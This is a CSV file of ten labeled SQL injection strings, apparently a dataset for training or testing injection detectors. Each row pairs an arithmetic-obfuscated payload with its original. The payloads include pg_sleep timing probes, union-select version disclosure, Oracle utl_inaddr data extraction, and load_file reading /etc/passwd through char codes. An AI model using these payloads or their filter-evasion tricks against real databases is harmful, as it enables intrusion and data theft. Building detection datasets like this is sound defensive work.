,Query,Label,Original
0," "" OR 2*3-6 OR 2/2-1 Or 8-8 oR pg_sleep  (  __TIME__  )  -- ",1,""" or pg_sleep  (  __TIME__  )  --"
1,create user name identified by pass123 temporary tablespace temp default tablespace users; ,1,create user name identified by pass123 temporary tablespace temp default tablespace users;
2," && 1 and 1 &&  0+2*3-6+1=2*3-6+2/2-1+0+0+utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE  SIN(0)+2/2-1+LIMIT+8-8+2*3-6+2/2-1=2/2-1+5+2/2-1+2*3-6   )    )    AND  SIN(0)+SIN(0)+0+'i'+0=2*3-6+8-8+'i+SIN(0)+2*3-6 ",1," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i"
3," select * from users where  8-8+2*3-6+id+SIN(0)+0+2*3-6=2*3-6+SIN(0)+2/2-1+8-8+'1'+8-8 oR SIN(0) Or 2*3-6 OR @  2*3-6+8-8+2/2-1+@1+2/2-1=1+2/2-1+0+SIN(0) union select 1,version  (    )   -- 1' ",1," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'"
4," select * from users where  2/2-1+id+2/2-1=2*3-6+1+2*3-6+2/2-1 || 8-8 OR 2*3-6 or 1# ""  (   union select 1,version  (    )   -- 1 ",1," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1"
5, select name from syscolumns where  0+2*3-6+id=2/2-1+0+(+2*3-6+2/2-1  select id from sysobjects where  8-8+SIN(0)+SIN(0)+2/2-1+name+0=8-8+2*3-6+2*3-6+0+tablename'  )  -- ,1, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --
6,select * from users where  0+2*3-6+id+2/2-1+2/2-1=2*3-6+2*3-6+1+2*3-6+SIN(0)+2*3-6 +$+ Or 2/2-1 || 2*3-6 ||  SIN(0)+8-8+0+1+SIN(0)=2*3-6+0+1+2/2-1 -- 1 ,1,select * from users where id  =  1 +$+ or 1  =  1 -- 1
7,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1; ",1,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;"
8," select * from users where  2*3-6+id+SIN(0)=0+0+'1'+0+SIN(0)+2*3-6 oR SIN(0) Or 0 or  SIN(0)+||/1+2*3-6=SIN(0)+1+8-8 union select 1,version  (    )   -- 1' ",1," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'"
9," select * from users where  id+SIN(0)+2*3-6+2/2-1+SIN(0)=0+'1'+0+0+0+8-8 Or 2/2-1 Or 2/2-1 oR \.<\ union select 1,@@VERSION -- 1' ",1," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'"
